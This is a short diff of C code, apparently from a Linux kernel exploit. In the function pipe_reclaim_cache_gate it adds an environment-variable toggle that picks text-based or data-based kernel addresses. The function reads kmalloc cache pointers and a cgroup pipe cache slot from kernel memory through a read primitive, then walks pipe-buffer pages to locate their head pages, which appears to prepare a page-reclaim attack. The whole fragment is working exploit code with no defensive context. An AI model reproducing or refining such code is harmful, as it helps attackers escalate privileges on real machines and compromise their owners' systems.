@@ -473,7 +473,15 @@ int pipe_reclaim_cache_gate(int fd) {
 
   uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
   memset(cache_slots, 0, sizeof(cache_slots));
-  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
+  const char *bootstrap = getenv("CFI_BOOTSTRAP");
+  int canonical_bootstrap =
+      bootstrap && strncmp(bootstrap, "canon", 5) == 0;
+  uintptr_t kmalloc_caches =
+      canonical_bootstrap ? text_addr(KMALLOC_CACHES)
+                          : data_addr(KMALLOC_CACHES);
+  uintptr_t kmalloc_cgroup_pipe_slot =
+      canonical_bootstrap ? text_addr(KMALLOC_CGROUP_PIPE_SLOT)
+                          : data_addr(KMALLOC_CGROUP_PIPE_SLOT);
   kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
   pr_info("phys gate caches=%016zx s0=%016llx s10=%016llx s11=%016llx cg10=%016llx cg11=%016llx\n",
           kmalloc_caches,
@@ -492,7 +500,7 @@ int pipe_reclaim_cache_gate(int fd) {
     cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];
 
   kmalloc_pipe_cache =
-    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
+    kernel_read64(fd, kmalloc_cgroup_pipe_slot);
   for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
     uintptr_t page = pipebuf_page_base + off;
     uintptr_t head = direct_to_head_page(fd, page);
